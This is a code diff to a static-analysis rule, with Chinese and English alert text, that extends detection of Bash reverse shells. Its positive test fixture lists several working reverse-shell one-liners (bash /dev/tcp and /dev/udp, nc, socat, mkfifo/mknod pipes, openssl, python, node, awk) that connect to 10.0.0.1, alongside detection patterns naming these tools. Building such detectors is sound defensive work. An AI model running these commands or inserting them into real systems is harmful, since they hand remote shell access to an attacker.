@@ -25,23 +25,29 @@ REFERENCE
 	alert_min: 1
 	"file://pos.sh": <<<POS
 bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+sh -i >& /dev/udp/10.0.0.1/4242 0>&1
 nc -e /bin/sh 10.0.0.1 4242
 socat TCP:10.0.0.1:4242 EXEC:/bin/sh
 mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f
+mknod /tmp/f p; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.1 4242 >/tmp/f
 openssl s_client -quiet -connect 10.0.0.1:4242
 telnet 10.0.0.1 8080 | /bin/sh | telnet 10.0.0.1 8081
 python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4242));subprocess.call(["/bin/sh","-i"])'
+node -e "require('net').connect(4444,'10.0.0.1')"
+awk 'BEGIN {s="/inet/tcp/0/10.0.0.1/4242"; s |& getline; print}'
 POS
 	"safefile://neg.sh": <<<NEG
 curl -fsSL https://example.com/x.sh | tar -xzf -
 nc -z example.com 443
 openssl version
 python -c 'print("hello")'
+node -e "console.log('hello')"
+awk 'BEGIN {print 1}'
 ssh example.com
 NEG
 )
 
-*?{have: /\/dev\/tcp\//} as $devTcpHit
+*?{have: /\/dev\/(tcp|udp)\//} as $devTcpHit
 
 /^(nc|ncat|netcat)$/ as $nc
 $nc(* as $ncArgs) as $ncCall
@@ -52,6 +58,9 @@ $socatCall?{have: /(?i)(exec:|tcp-connect:)/} as $socatHit
 
 mkfifo(* as $mkfifoArgs) as $mkfifoHit
 
+mknod(* as $mknodArgs) as $mknodCall
+$mknodCall?{have: /^p$/} as $mknodHit
+
 openssl(* as $opensslArgs) as $opensslCall
 $opensslCall?{have: /s_client/} as $opensslHit
 
@@ -59,9 +68,13 @@ $opensslCall?{have: /s_client/} as $opensslHit
 $shell(* as $shellArgs) as $shellCall
 $shellCall?{have: /telnet/} as $telnetHit
 
+/^(gawk|awk|mawk)$/ as $awk
+$awk(* as $awkArgs) as $awkCall
+$awkCall?{have: /inet\/tcp/} as $awkHit
+
 /^(python[0-9.]*|perl|ruby|php|node|nodejs|lua)$/ as $interp
 $interp(* as $interpArgs) as $interpCall
-$interpCall?{any: /socket/, /fsockopen/, /TCPSocket/, /child_process/, /\/dev\/tcp\//} as $interpHit
+$interpCall?{any: /socket/, /Socket/, /fsockopen/, /TCPSocket/, /child_process/, /\/dev\/tcp\//, /net\.connect/} as $interpHit
 
 alert $devTcpHit for {
 	level: "high",
@@ -95,6 +108,14 @@ alert $mkfifoHit for {
 	risk: "command-execution",
 }
 
+alert $mknodHit for {
+	level: "high",
+	title: "Bash: reverse shell or remote command channel",
+	title_zh: "Bash：反弹 Shell 或远程命令通道",
+	message: "检测到 mknod 创建命名管道，常见于反弹 Shell 管道。",
+	risk: "command-execution",
+}
+
 alert $opensslHit for {
 	level: "high",
 	title: "Bash: reverse shell or remote command channel",
@@ -116,5 +137,13 @@ alert $interpHit for {
 	title: "Bash: reverse shell or remote command channel",
 	title_zh: "Bash：反弹 Shell 或远程命令通道",
 	message: "检测到解释器内联 socket/fsockopen 代码。",
+	risk: "command-execution",
+}
+
+alert $awkHit for {
+	level: "high",
+	title: "Bash: reverse shell or remote command channel",
+	title_zh: "Bash：反弹 Shell 或远程命令通道",
+	message: "检测到 awk 使用 /inet/tcp 建立网络连接。",
 	risk: "command-execution",
 }
